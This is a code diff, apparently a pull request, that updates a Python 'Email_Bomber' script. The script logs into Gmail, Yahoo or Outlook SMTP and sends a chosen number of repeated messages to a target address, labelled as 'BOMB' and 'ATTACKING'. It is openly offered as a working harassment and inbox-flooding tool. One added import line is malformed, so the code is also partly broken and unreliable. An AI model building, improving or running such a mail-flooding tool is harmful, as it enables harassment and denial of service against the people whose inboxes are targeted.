@@ -1,8 +1,13 @@
 #// Don't forget to hit SUBSCRIBE, COMMENT, LIKE, SHARE! and LEARN... :)
 # But srsly, hit that sub button so you don't miss out on more content! 
 
+# {PR | UP TO DATE | "WORKS ON MY MACHINE"} #
+# PR Notice: If you'd like to manually specify string inputs, go ahead. Or else, just take them out. I left some in so you'd have the choice. #
 
 '''imports'''
+# Import MIME Library #
+import email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 import smtplib
 import sys
 
@@ -11,6 +16,8 @@ class bcolors:
     GREEN = '\033[92m'
     YELLOW = '\033[93m'
     RED = '\033[91m'
+    # Add Blue {OPTIONAL} #
+    BLUE = '\033[94m'
 
 
 def banner():
@@ -84,18 +91,31 @@ class Email_Bomber:
 
             if self.server == '1':
                 self.server = 'smtp.gmail.com'
+                print(bcolors.GREEN + "You'll have to create an application project in order to use the gmail option.")
             elif self.server == '2':
                 self.server = 'smtp.mail.yahoo.com'
             elif self.server == '3':
                 self.server = 'smtp-mail.outlook.com'
 
-            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
-            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
-            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
-            self.message = str(input(bcolors.GREEN + 'Enter message <: '))
+            # Improved Input Handling. #
+            self.fromAddr = input(bcolors.BLUE + 'Enter from address <: ')
+            self.fromPwd = input(bcolors.BLUE + 'Enter from password <: ')
+            self.subject = input(bcolors.BLUE + 'Enter subject <: ')
+            self.message = input(bcolors.BLUE + 'Enter message <: ')
 
-            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
-            ''' % (self.fromAddr, self.target, self.subject, self.message)
+            
+                # Old Way. Delete If You'd Like. #
+            # self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
+            # self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
+            # self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
+            # self.message = str(input(bcolors.GREEN + 'Enter message <: '))
+
+                # Using MIME Library To Circumvent Message & String Format Issue #
+            self.msg = MIMEMultipart()
+            self.msg['From'] = self.fromAddr
+            self.msg['To'] = self.target
+            self.msg['Subject'] = self.subject
+            self.msg.attach(MIMEText(self.message, 'plain'))
 
             self.s = smtplib.SMTP(self.server, self.port)
             self.s.ehlo()
@@ -105,21 +125,52 @@ class Email_Bomber:
         except Exception as e:
             print(f'ERROR: {e}')
 
+            # Old Way. Delete If You'd Like. #
+        #     self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
+        #     ''' % (self.fromAddr, self.target, self.subject, self.message)
+
+        #     self.s = smtplib.SMTP(self.server, self.port)
+        #     self.s.ehlo()
+        #     self.s.starttls()
+        #     self.s.ehlo()
+        #     self.s.login(self.fromAddr, self.fromPwd)
+        # except Exception as e:
+        #     print(f'ERROR: {e}')
+
+
     def send(self):
         try:
-            self.s.sendmail(self.fromAddr, self.target, self.msg)
-            self.count +=1
-            print(bcolors.YELLOW + f'BOMB: {self.count}')
+            self.s.sendmail(self.fromAddr, self.target, self.msg.as_string())
+            self.count += 1
+            print(bcolors.GREEN + f'BOMB: {self.count}')
         except Exception as e:
             print(f'ERROR: {e}')
 
     def attack(self):
-        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
-        for email in range(self.amount+1):
+        print(bcolors.GREEN + '\n[+] ATTACKING... [+]')
+        for email in range(self.amount + 1):
             self.send()
         self.s.close()
-        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
+        print(bcolors.GREEN + '\n [+] ATTACK FINISHED! [+]')
         sys.exit(0)
+
+
+        # Old Way. Delete If You'd Like. #
+    # def send(self):
+    #     try:
+    #         self.s.sendmail(self.fromAddr, self.target, self.msg)
+    #         self.count +=1
+    #         print(bcolors.YELLOW + f'BOMB: {self.count}')
+    #     except Exception as e:
+    #         print(f'ERROR: {e}')
+
+    # def attack(self):
+    #     print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
+    #     for email in range(self.amount+1):
+    #         self.send()
+    #     self.s.close()
+    #     print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
+    #     sys.exit(0)
 
 
 if __name__=='__main__':
